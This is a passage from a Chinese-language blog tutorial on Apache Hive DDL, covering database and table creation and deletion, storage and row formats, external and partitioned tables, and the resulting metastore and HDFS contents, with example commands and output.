class="string">'create_time'</span>=<span class="string">'2018-01-15 20:35'</span>);</span></span><br></pre></td></tr></table></figure>
<p>修改完成后,查看mysql中元数据信息:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">mysql&gt; select * from DATABASE_PARAMS;</span><br><span class="line">+<span class="comment">-------+-------------+------------------+</span></span><br><span class="line">| DB_ID | PARAM_KEY   | PARAM_VALUE      |</span><br><span class="line">+<span class="comment">-------+-------------+------------------+</span></span><br><span class="line">|     7 | create_by   | xwolf            |</span><br><span class="line">|     7 | create_time | 2018-01-15 20:35 |</span><br><span class="line">+<span class="comment">-------+-------------+------------------+</span></span><br><span class="line">2 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">select</span> * <span class="keyword">from</span> DBS <span class="keyword">where</span> DB_ID = <span class="number">7</span>;</span><br><span class="line">+<span class="comment">-------+---------------+-----------------------+-------+------------+------------+</span></span><br><span class="line">| DB_ID | DESC          | DB_LOCATION_URI       | NAME  | OWNER_NAME | OWNER_TYPE |</span><br><span class="line">+<span class="comment">-------+---------------+-----------------------+-------+------------+------------+</span></span><br><span class="line">|     7 | test database | hdfs://hn1/hive/tests | test1 | root       | USER       |</span><br><span class="line">+<span class="comment">-------+---------------+-----------------------+-------+------------+------------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>
<blockquote>
<ul>
<li>删除数据库</li>
</ul>
</blockquote>
<p>语法:<br>DROP (DATABASE|SCHEMA) [IF EXISTS] database_name [RESTRICT|CASCADE];</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">数据库中有表时无法删除</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">hive (test1)&gt; drop schema <span class="keyword">if</span> exists test1;</span></span><br><span class="line"></span><br><span class="line">FAILED: Execution Error, return code 1 from org.apache.hadoop.hive.ql.exec.DDLTask. InvalidOperationException(message:Database test1 is not empty. One or more tables exist.)</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">hive (test1)&gt; drop schema <span class="keyword">if</span> exists test1 restrict;</span></span><br><span class="line"></span><br><span class="line">FAILED: Execution Error, return code 1 from org.apache.hadoop.hive.ql.exec.DDLTask. InvalidOperationException(message:Database test1 is not empty. One or more tables exist.)</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">级联删除可删除所有关联的表和数据.</span></span><br><span class="line"><span class="meta">#</span><span class="bash">hive (test1)&gt; drop database <span class="keyword">if</span> exists test1 cascade;</span></span><br><span class="line">OK</span><br><span class="line">Time taken: 2.623 seconds</span><br></pre></td></tr></table></figure>
<h2 id="表操作"><a href="#表操作" class="headerlink" title="表操作"></a>表操作</h2><blockquote>
<ul>
<li>创建表</li>
</ul>
</blockquote>
<p>语法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CREATE [TEMPORARY] [EXTERNAL] TABLE [IF NOT EXISTS] [db_name.]table_name    -- ( TEMPORARY 在0.14.0版本后可用)</span><br><span class="line">  [(col_name data_type [COMMENT col_comment], ... [constraint_specification])]</span><br><span class="line">  [COMMENT table_comment]</span><br><span class="line">  [PARTITIONED BY (col_name data_type [COMMENT col_comment], ...)]</span><br><span class="line">  [CLUSTERED BY (col_name, col_name, ...) [SORTED BY (col_name [ASC|DESC], ...)] INTO num_buckets BUCKETS]</span><br><span class="line">  [SKEWED BY (col_name, col_name, ...)                  -- ( 0.10.0版本后可用)]</span><br><span class="line">     ON ((col_value, col_value, ...), (col_value, col_value, ...), ...)</span><br><span class="line">     [STORED AS DIRECTORIES]</span><br><span class="line">  [</span><br><span class="line">   [ROW FORMAT row_format] </span><br><span class="line">   [STORED AS file_format]</span><br><span class="line">     | STORED BY &apos;storage.handler.class.name&apos; [WITH SERDEPROPERTIES (...)]  -- (0.6.0后可用)</span><br><span class="line">  ]</span><br><span class="line">  [LOCATION hdfs_path]</span><br><span class="line">  [TBLPROPERTIES (property_name=property_value, ...)]   -- (0.6.0后可用)</span><br><span class="line">  [AS select_statement];   -- (0.5.0后可用; 不支持外部表)</span><br><span class="line"></span><br><span class="line">CREATE [TEMPORARY] [EXTERNAL] TABLE [IF NOT EXISTS] [db_name.]table_name</span><br><span class="line">  LIKE existing_table_or_view_name</span><br><span class="line">  [LOCATION hdfs_path];</span><br><span class="line"></span><br><span class="line">data_typ</span><br><span class="line">  : primitive_type</span><br><span class="line">  | array_type</span><br><span class="line">  | map_type</span><br><span class="line">  | struct_type</span><br><span class="line">  | union_type  -- (0.7.0后可用)</span><br><span class="line"></span><br><span class="line">primitive_type</span><br><span class="line">  : TINYINT</span><br><span class="line">  | SMALLINT</span><br><span class="line">  | INT</span><br><span class="line">  | BIGINT</span><br><span class="line">  | BOOLEAN</span><br><span class="line">  | FLOAT</span><br><span class="line">  | DOUBLE</span><br><span class="line">  | DOUBLE PRECISION -- (2.2.0后可用)</span><br><span class="line">  | STRING</span><br><span class="line">  | BINARY      -- (0.8.0后可用)</span><br><span class="line">  | TIMESTAMP   -- (0.8.0后可用)</span><br><span class="line">  | DECIMAL     -- (0.11.0后可用)</span><br><span class="line">  | DECIMAL(precision, scale)  -- (0.13.0后可用)</span><br><span class="line">  | DATE        -- (0.12.0后可用)</span><br><span class="line">  | VARCHAR     -- (0.12.0后可用)</span><br><span class="line">  | CHAR        -- (0.13.0后可用)</span><br><span class="line"></span><br><span class="line">array_type</span><br><span class="line">  : ARRAY &lt; data_type &gt;</span><br><span class="line"></span><br><span class="line">map_type</span><br><span class="line">  : MAP &lt; primitive_type, data_type &gt;</span><br><span class="line"></span><br><span class="line">struct_type</span><br><span class="line">  : STRUCT &lt; col_name : data_type [COMMENT col_comment], ...&gt;</span><br><span class="line"></span><br><span class="line">union_type</span><br><span class="line">   : UNIONTYPE &lt; data_type, data_type, ... &gt;  -- (0.7.0后可用)</span><br><span class="line"></span><br><span class="line">row_format</span><br><span class="line">  : DELIMITED [FIELDS TERMINATED BY char [ESCAPED BY char]] [COLLECTION ITEMS TERMINATED BY char]</span><br><span class="line">        [MAP KEYS TERMINATED BY char] [LINES TERMINATED BY char]</span><br><span class="line">        [NULL DEFINED AS char]   -- (0.13.0后可用)</span><br><span class="line">  | SERDE serde_name [WITH SERDEPROPERTIES (property_name=property_value, property_name=property_value, ...)]</span><br><span class="line"></span><br><span class="line">file_format:</span><br><span class="line">  : SEQUENCEFILE</span><br><span class="line">  | TEXTFILE    -- (Default, depending on hive.default.fileformat configuration)</span><br><span class="line">  | RCFILE      -- (0.6.0后可用)</span><br><span class="line">  | ORC         -- (0.11.0后可用)</span><br><span class="line">  | PARQUET     -- (0.13.0后可用)</span><br><span class="line">  | AVRO        -- (0.14.0后可用)</span><br><span class="line">  | INPUTFORMAT input_format_classname OUTPUTFORMAT output_format_classname</span><br><span class="line"></span><br><span class="line">constraint_specification:</span><br><span class="line">  : [, PRIMARY KEY (col_name, ...) DISABLE NOVALIDATE ]</span><br><span class="line">    [, CONSTRAINT constraint_name FOREIGN KEY (col_name, ...) REFERENCES table_name(col_name, ...) DISABLE NOVALIDATE</span><br></pre></td></tr></table></figure>
<h3 id="Hive存储格式"><a href="#Hive存储格式" class="headerlink" title="Hive存储格式"></a>Hive存储格式</h3><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">存储格式</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">STORED AS TEXTFILE</td>
<td style="text-align:center">存储为纯文本文件。TEXTFILE是默认的文件格式，除非配置参数hive.default.fileformat有不同的设置.使用DELIMITED 子句来读取分隔的文件。通过使用“转义”子句(如“转义\”)来转义分隔符字符如果您想使用能够包含这些分隔符字符的数据，那么就需要转义。还可以使用“NULL DEFINED AS”子句(默认为’\N’)指定一个自定义的NULL格式。</td>
</tr>
<tr>
<td style="text-align:center">STORED AS SEQUENCEFILE</td>
<td style="text-align:center">存储为压缩的序列文件。</td>
</tr>
<tr>
<td style="text-align:center">STORED AS ORC</td>
<td style="text-align:center">存储为ORC文件格式。支持ACID事务和基于成本的优化器(CBO)。存储列级元数据。</td>
</tr>
<tr>
<td style="text-align:center">STORED AS PARQUET</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">STORED AS AVRO</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">STORED AS RCFILE</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">STORED BY</td>
<td style="text-align:center">以非本地表格式存储。要创建或链接到一个非本地的表，例如一个由<a href="https://cwiki.apache.org/confluence/display/Hive/HBaseIntegration" target="_blank" rel="noopener">HBase</a>或<a href="https://cwiki.apache.org/confluence/display/Hive/Druid+Integration" target="_blank" rel="noopener">Druid</a>或<a href="https://cwiki.apache.org/confluence/display/Hive/AccumuloIntegration" target="_blank" rel="noopener">Accumulo</a>的表支持的表.有关此选项的更多信息，请参见<a href="https://cwiki.apache.org/confluence/display/Hive/StorageHandlers" target="_blank" rel="noopener">storagehandler</a>。</td>
</tr>
<tr>
<td style="text-align:center">INPUTFORMAT and OUTPUTFORMAT</td>
<td style="text-align:center">在file_format中，指定相应的InputFormat和OutputFormat类的名称作为字符串文字。例如,“org.apache.hadoop.hive.contrib.fileformat.base64.Base64TextInputFormat。对于LZO压缩，使用的值是 INPUTFORMAT“com.hadoop.mapred.DeprecatedLzoTextInputFormat” OUTPUTFORMAT“org.apache.hadoop.hive.ql.io.HiveIgnoreKeyTextOutputFormat”(<a href="https://cwiki.apache.org/confluence/display/Hive/LanguageManual+LZO" target="_blank" rel="noopener">见LZO压缩</a>)。</td>
</tr>
</tbody>
</table>
</div>
<h3 id="行格式化"><a href="#行格式化" class="headerlink" title="行格式化"></a>行格式化</h3><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">格式</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><strong>RegEx</strong></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">ROW FORMAT SERDE ‘org.apache.hadoop.hive.serde2.RegexSerDe’ WITH SERDEPROPERTIES(“input.regex” = “<regex>“) STORED AS TEXTFILE;</regex></td>
<td style="text-align:center">存储为纯文本文件，由正则表达式翻译。下面的例子在默认的Apache Weblog格式中定义了一个表。CREATE TABLE apachelog (host STRING,identity STRING,user STRING,time STRING,request STRING,status STRING,size STRING,referer STRING,agent STRING)ROW FORMAT SERDE ‘org.apache.hadoop.hive.serde2.RegexSerDe’WITH SERDEPROPERTIES (“input.regex” = “(<sup><a href="#fn_" id="reffn_"></a></sup><em>) (<sup><a href="#fn_" id="reffn_"></a></sup></em>) (<sup><a href="#fn_" id="reffn_"></a></sup>*) (-</td>
<td>\<sup><a href="#fn_\\]*\\" id="reffn_\\]*\\">\\]*\\</a></sup>) (<sup><a href="#fn_ \" " id="reffn_ \"> \"</a></sup>*</td>
<td>\”<sup><a href="#fn_\" " id="reffn_\">\"</a></sup>*\”) (-</td>
<td>[0-9]*) (-</td>
<td>[0-9]<em>)(?: (<sup><a href="#fn_ \" " id="reffn_ \"> \"</a></sup></em></td>
<td>\”.<em>\”) (<sup><a href="#fn_ \" " id="reffn_ \"> \"</a></sup></em></td>
<td>\”.*\”))?”)</td>
</tr>
<tr>
<td style="text-align:center"><strong>JSON</strong></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">ROW FORMAT SERDE ‘org.apache.hive.hcatalog.data.JsonSerDe’ STORED AS TEXTFILE</td>
<td style="text-align:center">以JSON格式存储为纯文本文件。JSON文件的JsonSerDe在Hive 0.12和后面都可以使用。在一些发行版中，对hih编目-core的引用。jar是必需的。添加JAR /usr/lib/hive-hcatalog/lib/hive-hcatalog-core.jar; CREATE TABLE mytable(a string,b bigint，…)ROW FORMAT SERDE ‘org.apache.hive.hcatalog.data.JsonSerDe’ STORED AS TEXTFILE;</td>
</tr>
<tr>
<td style="text-align:center"><strong>CSV/TSV</strong></td>
</tr>
<tr>
<td style="text-align:center">ROW FORMAT SERDE ‘org.apache.hadoop.hive.serde2.OpenCSVSerde’ STORED AS TEXTFILE</td>
<td style="text-align:center">以CSV/TSV格式存储为纯文本文件。例子:      CREATE TABLE my_table(a string, b string, …) ROW FORMAT SERDE ‘org.apache.hadoop.hive.serde2.OpenCSVSerde’ WITH SERDEPROPERTIES ( “separatorChar” = “\t”, “quoteChar”=”‘“ ,”escapeChar”    = “\“) STORED AS TEXTFILE;    SerDe的默认属性是逗号分隔(CSV)文件。      这个SerDe适用于大多数CSV数据，但是不处理嵌入的新行。使用SerDe,org.apache.hadoop.hive.serde2.OpenCSVSerde指定完全限定类名。文档是基于原始文档:<a href="https://github.com/ogrodnek/csv-serde" target="_blank" rel="noopener">https://github.com/ogrodnek/csv-serde</a>  <strong>局限性</strong>    这个SerDe将所有列都处理为String类型。即使使用这个SerDe创建一个非string列类型的表，描述表的输出也会显示字符串列类型。类型信息是从SerDe检索的。要将列转换为表中所需的类型，可以在表上创建一个视图，该视图将转换为所需类型。</td>
</tr>
<tr>
<td style="text-align:center"></td>
</tr>
</tbody>
</table>
</div>
<h4 id="普通表-native-managed-TABLE"><a href="#普通表-native-managed-TABLE" class="headerlink" title="普通表(native/managed TABLE)"></a>普通表(native/managed TABLE)</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">&gt;hive  CREATE  TABLE test2.user_info  (id INT COMMENT <span class="string">'user id'</span> ,name STRING COMMENT <span class="string">'user name'</span>) COMMENT <span class="string">'user info'</span> ROW FORMAT DELIMITED FIELDS TERMINATED BY <span class="string">','</span> STORED AS TEXTFILE TBLPROPERTIES (<span class="string">'create_by'</span>=<span class="string">'xwolf'</span>,<span class="string">'create_time'</span>=<span class="string">'2018-01-16 14:40'</span>,<span class="string">'address'</span>=<span class="string">'BeiJing'</span>);</span></span><br></pre></td></tr></table></figure>
<p>查看mysql中元数据信息</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> SELECT * FROM TBLS WHERE TBL_ID = 11;</span></span><br><span class="line">+--------+-------------+-------+------------------+-------+-----------+-------+-----------+---------------+--------------------+--------------------+--------------------+</span><br><span class="line">| TBL_ID | CREATE_TIME | DB_ID | LAST_ACCESS_TIME | OWNER | RETENTION | SD_ID | TBL_NAME  | TBL_TYPE      | VIEW_EXPANDED_TEXT | VIEW_ORIGINAL_TEXT | IS_REWRITE_ENABLED |</span><br><span class="line">+--------+-------------+-------+------------------+-------+-----------+-------+-----------+---------------+--------------------+--------------------+--------------------+</span><br><span class="line">|     11 |  1516083902 |     8 |                0 | root  |         0 |    11 | user_info | MANAGED_TABLE | NULL               | NULL               |                    |</span><br><span class="line">+--------+-------------+-------+------------------+-------+-----------+-------+-----------+---------------+--------------------+--------------------+--------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> SELECT * FROM TABLE_PARAMS WHERE TBL_ID=11;</span></span><br><span class="line">+--------+-----------------------+------------------------+</span><br><span class="line">| TBL_ID | PARAM_KEY             | PARAM_VALUE            |</span><br><span class="line">+--------+-----------------------+------------------------+</span><br><span class="line">|     11 | COLUMN_STATS_ACCURATE | &#123;"BASIC_STATS":"true"&#125; |</span><br><span class="line">|     11 | address               | BeiJing                |</span><br><span class="line">|     11 | comment               | user info              |</span><br><span class="line">|     11 | create_by             | xwolf                  |</span><br><span class="line">|     11 | create_time           | 2018-01-16 14:40       |</span><br><span class="line">|     11 | numFiles              | 0                      |</span><br><span class="line">|     11 | numRows               | 0                      |</span><br><span class="line">|     11 | rawDataSize           | 0                      |</span><br><span class="line">|     11 | totalSize             | 0                      |</span><br><span class="line">|     11 | transient_lastDdlTime | 1516083902             |</span><br><span class="line">+--------+-----------------------+------------------------+</span><br><span class="line">10 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#指定不同的分隔符</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash">&gt;hive CREATE  TABLE test2.user_info_2 (id INT COMMENT <span class="string">'user id'</span> ,name STRING COMMENT <span class="string">'user name'</span>) COMMENT <span class="string">'user info2'</span> ROW FORMAT DELIMITED FIELDS TERMINATED BY <span class="string">'&amp;&amp;'</span> STORED AS TEXTFILE  TBLPROPERTIES (<span class="string">'create_by'</span>=<span class="string">'xwolf'</span>,<span class="string">'create_time'</span>=<span class="string">'2018-01-16 14:50'</span>,<span class="string">'address'</span>=<span class="string">'BeiJingSanYuanQiao'</span>);</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#分别插入两条数据</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">&gt;hive insert into user_info values (1,<span class="string">'laowang'</span>),(2,<span class="string">'laoli'</span>);</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">&gt;hive insert into user_info_2 values (1,<span class="string">'laowang'</span>),(2,<span class="string">'laoli'</span>);</span></span><br></pre></td></tr></table></figure>
<p>查看HDFS中的数据格式:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#user_info</span><br><span class="line"></span><br><span class="line">1,laowang</span><br><span class="line">2,laoli</span><br><span class="line"></span><br><span class="line">#user_info_2</span><br><span class="line"></span><br><span class="line">1&amp;laowang</span><br><span class="line">2&amp;laoli</span><br></pre></td></tr></table></figure>
<p>可见可以通过ROW FORMAT来指定字段的分隔符.</p>
<h4 id="外部表"><a href="#外部表" class="headerlink" title="外部表"></a>外部表</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">EXTERNAL</span> <span class="keyword">TABLE</span> page_view_1(viewTime <span class="built_in">INT</span>, userid <span class="built_in">BIGINT</span>,</span><br><span class="line">     page_url <span class="keyword">STRING</span>, referrer_url <span class="keyword">STRING</span>,</span><br><span class="line">     ip <span class="keyword">STRING</span> <span class="keyword">COMMENT</span> <span class="string">'IP Address of the User'</span>,</span><br><span class="line">     country <span class="keyword">STRING</span> <span class="keyword">COMMENT</span> <span class="string">'country of origination'</span>)</span><br><span class="line"> <span class="keyword">COMMENT</span> <span class="string">'This is the staging page view table'</span></span><br><span class="line"> <span class="keyword">ROW</span> <span class="keyword">FORMAT</span> <span class="keyword">DELIMITED</span> <span class="keyword">FIELDS</span> <span class="keyword">TERMINATED</span> <span class="keyword">BY</span> <span class="string">'$'</span></span><br><span class="line"> <span class="keyword">STORED</span> <span class="keyword">AS</span> TEXTFILE</span><br><span class="line"> LOCATION <span class="string">'/hive/test/page_view_1.db'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*修改数据位置*/</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> page_view_1 <span class="keyword">set</span> LOCATION <span class="string">'/hive/test/page_view_1'</span>;</span><br></pre></td></tr></table></figure>
<p>在HDFS中指定目录即可查看到数据文件。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*删除表*/</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> page_view_1;</span><br></pre></td></tr></table></figure>
<p>在HDFS中指定目录依然可以查看到数据文件,外部表删除只会删除元数据,数据文件依然存在.</p>
<h4 id="分区表"><a href="#分区表" class="headerlink" title="分区表"></a>分区表</h4><p>insert语法:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">## 通过查询插入Hive表中</span><br><span class="line"></span><br><span class="line">Standard syntax:</span><br><span class="line">INSERT OVERWRITE TABLE tablename1 [PARTITION (partcol1=val1, partcol2=val2 ...) [IF NOT EXISTS]] select_statement1 FROM from_statement;</span><br><span class="line">INSERT INTO TABLE tablename1 [PARTITION (partcol1=val1, partcol2=val2 ...)] select_statement1 FROM from_statement;</span><br><span class="line"></span><br><span class="line">Hive extension (multiple inserts):</span><br><span class="line">FROM from_statement</span><br><span class="line">INSERT OVERWRITE TABLE tablename1 [PARTITION (partcol1=val1, partcol2=val2 ...) [IF NOT EXISTS]] select_statement1</span><br><span class="line">[INSERT OVERWRITE TABLE tablename2 [PARTITION ... [IF NOT EXISTS]] select_statement2]</span><br><span class="line">[INSERT INTO TABLE tablename2 [PARTITION ...] select_statement2] ...;</span><br><span class="line">FROM from_statement</span><br><span class="line">INSERT INTO TABLE tablename1 [PARTITION (partcol1=val1, partcol2=val2 ...)] select_statement1</span><br><span class="line">[INSERT INTO TABLE tablename2 [PARTITION ...] select_statement2]</span><br><span class="line">[INSERT OVERWRITE TABLE tablename2 [PARTITION ... [IF NOT EXISTS]] select_statement2] ...;</span><br><span class="line"> </span><br><span class="line">Hive extension (dynamic partition inserts):</span><br><span class="line">INSERT OVERWRITE TABLE tablename PARTITION (partcol1[=val1], partcol2[=val2] ...) select_statement FROM from_statement;</span><br><span class="line">INSERT INTO TABLE tablename PARTITION (partcol1[=val1], partcol2[=val2] ...) select_statement FROM from_statement;</span><br><span class="line"></span><br><span class="line">## 查询语句写入文件系统</span><br><span class="line"></span><br><span class="line">Standard syntax:</span><br><span class="line">INSERT OVERWRITE [LOCAL] DIRECTORY directory1</span><br><span class="line">  [ROW FORMAT row_format] [STORED AS file_format] (Note: Only available starting with Hive 0.11.0)</span><br><span class="line">  SELECT ... FROM ...</span><br><span class="line"> </span><br><span class="line">Hive extension (multiple inserts):</span><br><span class="line">FROM from_statement</span><br><span class="line">INSERT OVERWRITE [LOCAL] DIRECTORY directory1 select_statement1</span><br><span class="line">[INSERT OVERWRITE [LOCAL] DIRECTORY directory2 select_statement2] ...</span><br><span class="line"></span><br><span class="line">row_format</span><br><span class="line">  : DELIMITED [FIELDS TERMINATED BY char [ESCAPED BY char]] [COLLECTION ITEMS TERMINATED BY char]</span><br><span class="line">        [MAP KEYS TERMINATED BY char] [LINES TERMINATED BY char]</span><br><span class="line">        [NULL DEFINED AS char] (Note: Only available starting with Hive 0.13)</span><br><span class="line"></span><br><span class="line">#### 插入值</span><br><span class="line"></span><br><span class="line">Standard Syntax:</span><br><span class="line">INSERT INTO TABLE tablename [PARTITION (partcol1[=val1], partcol2[=val2] ...)] VALUES values_row [, values_row ...]</span><br><span class="line"> </span><br><span class="line">Where values_row is:</span><br><span class="line">( value [, value ...] )</span><br><span class="line">where a value is either null or any valid SQL literal</span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*单分区建表语句*/</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> page_view_2(viewTime <span class="built_in">INT</span>, userid <span class="built_in">BIGINT</span>,</span><br><span class="line">     page_url <span class="keyword">STRING</span>, referer_url <span class="keyword">STRING</span>,</span><br><span class="line">     ip <span class="keyword">STRING</span> <span class="keyword">COMMENT</span> <span class="string">'IP Address of the User'</span>)</span><br><span class="line"> <span class="keyword">COMMENT</span> <span class="string">'This is the page view table'</span></span><br><span class="line"> PARTITIONED <span class="keyword">BY</span>(country <span class="keyword">STRING</span>)</span><br><span class="line"> <span class="keyword">ROW</span> <span class="keyword">FORMAT</span> <span class="keyword">DELIMITED</span></span><br><span class="line">   <span class="keyword">FIELDS</span> <span class="keyword">TERMINATED</span> <span class="keyword">BY</span> <span class="string">'@'</span></span><br><span class="line"> <span class="keyword">STORED</span> <span class="keyword">AS</span> SEQUENCEFILE;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/*插入数据*/</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">INSERT</span> OVERWRITE  <span class="keyword">TABLE</span> page_view_2 </span><br><span class="line"> <span class="keyword">PARTITION</span> (country=<span class="string">'cn'</span>) <span class="keyword">VALUES</span> (<span class="number">1232232</span>,<span class="number">1</span>,<span class="string">'http://baidu.com'</span>,<span class="string">'http://jd.com'</span>,<span class="string">'124.2.2.2'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">INSERT</span> OVERWRITE  <span class="keyword">TABLE</span> page_view_2 </span><br><span class="line"> <span class="keyword">PARTITION</span> (country=<span class="string">'us'</span>) <span class="keyword">VALUES</span> (<span class="number">189434</span>,<span class="number">2</span>,<span class="string">'http://alibaba.com'</span>,<span class="string">'http://taobao.com'</span>,<span class="string">'134.4.2.1'</span>),</span><br><span class="line"> (<span class="number">1893</span>,<span class="number">21</span>,<span class="string">'http://163.com'</span>,<span class="string">'http://132.com'</span>,<span class="string">'143.43.34.41'</span>);</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#查看数据</span></span></span><br><span class="line">hive (test2)&gt; select * from page_view_2 where country ='cn';</span><br><span class="line">OK</span><br><span class="line">1232232	1	http://baidu.com	http://jd.com	124.2.2.2	cn</span><br><span class="line">Time taken: 1.241 seconds, Fetched: 1 row(s)</span><br><span class="line"></span><br><span class="line">hive (test2)&gt; select * from page_view_2 where country ='us';</span><br><span class="line">OK</span><br><span class="line">189434	2	http://alibaba.com	http://taobao.com	134.4.2.1	us</span><br><span class="line">1893	21	http://163.com	http://132.com	143.43.34.41	us</span><br><span class="line">Time taken: 0.282 seconds, Fetched: 2 row(s)</span><br></pre></td></tr></table></figure>
<p>查看HDFS中文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@hadoop02 datas]# hadoop fs -ls /hive/tests/test.db/page_view_2</span><br><span class="line">Found 2 items</span><br><span class="line">drwxr-xr-x   - root supergroup          0 2018-01-16 19:46 /hive/tests/test.db/page_view_2/country=cn</span><br><span class="line">drwxr-xr-x   - root supergroup          0 2018-01-16 19:48 /hive/tests/test.db/page_view_2/country=us</span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/*多分区建表*/</span></span><br><span class="line"> <span class="keyword">CREATE</span> <span class="keyword">TABLE</span> page_view_3(viewTime <span class="built_in">INT</span>, userid <span class="built_in">BIGINT</span>,</span><br><span class="line">     page_url <span class="keyword">STRING</span>, referer_url <span class="keyword">STRING</span>,</span><br><span class="line">     ip <span class="keyword">STRING</span> <span class="keyword">COMMENT</span> <span class="string">'IP Address of the User'</span>)</span><br><span class="line"> <span class="keyword">COMMENT</span> <span class="string">'This is the page view table'</span></span><br><span class="line"> PARTITIONED <span class="keyword">BY</span>(<span class="keyword">status</span> <span class="keyword">STRING</span>, country <span class="keyword">STRING</span>)</span><br><span class="line"> <span class="keyword">ROW</span> <span class="keyword">FORMAT</span> <span class="keyword">DELIMITED</span></span><br><span class="line">   <span class="keyword">FIELDS</span> <span class="keyword">TERMINATED</span> <span class="keyword">BY</span> <span class="string">'@'</span></span><br><span class="line"> <span class="keyword">STORED</span> <span class="keyword">AS</span> SEQUENCEFILE;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*插入数据*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">INSERT</span> OVERWRITE  <span class="keyword">TABLE</span> page_view_3 </span><br><span class="line"><span class="keyword">PARTITION</span> (country=<span class="string">'cn'</span>,<span class="keyword">status</span>=<span class="string">'1'</span>) <span class="keyword">VALUES</span> (<span class="number">1232232</span>,<span class="number">1</span>,<span class="string">'http://baidu.com'</span>,<span class="string">'http://jd.com'</span>,<span class="string">'124.2.2.2'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">INSERT</span> OVERWRITE  <span class="keyword">TABLE</span> page_view_3 </span><br><span class="line"><span class="keyword">PARTITION</span> (country=<span class="string">'us'</span>,<span class="keyword">status</span>=<span class="string">'1'</span>) <span class="keyword">VALUES</span> (<span class="number">189434</span>,<span class="number">2</span>,<span class="string">'http://alibaba.com'</span>,<span class="string">'http://taobao.com'</span>,<span class="string">'134.4.2.1'</span>),</span><br><span class="line"> (<span class="number">1893</span>,<span class="number">21</span>,<span class="string">'http://163.com'</span>,<span class="string">'http://132.com'</span>,<span class="string">'143.43.34.41'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">INSERT</span> OVERWRITE  <span class="keyword">TABLE</span> page_view_3 </span><br><span class="line"><span class="keyword">PARTITION</span> (country=<span class="string">'cn'</span>,<span class="keyword">status</span>=<span class="string">'2'</span>) <span class="keyword">VALUES</span> (<span class="number">189434</span>,<span class="number">2</span>,<span class="string">'http://alibaba.com'</span>,<span class="string">'http://taobao.com'</span>,<span class="string">'134.4.2.1'</span>),</span><br><span class="line"> (<span class="number">1893</span>,<span class="number">21</span>,<span class="string">'http://163.com'</span>,<span class="string">'http://132.com'</span>,<span class="string">'143.43.34.41'</span>);</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"> /*查看数据*/</span><br><span class="line"> hive (test2)&gt; select * from page_view_3;</span><br><span class="line">OK</span><br><span class="line">1232232	1	http://baidu.com	http://jd.com	124.2.2.2	1	cn</span><br><span class="line">189434	2	http://alibaba.com	http://taobao.com	134.4.2.1	1	us</span><br><span class="line">1893	21	http://163.com	http://132.com	143.43.34.41	1	us</span><br><span class="line">189434	2	http://alibaba.com	http://taobao.com	134.4.2.1	2	cn</span><br><span class="line">1893	21	http://163.com	http://132.com	143.43.34.41	2	cn</span><br><span class="line">Time taken: 0.482 seconds, Fetched: 5 row(s)</span><br></pre></td></tr></table></figure>
<p>查看HDFS中文件,</p>
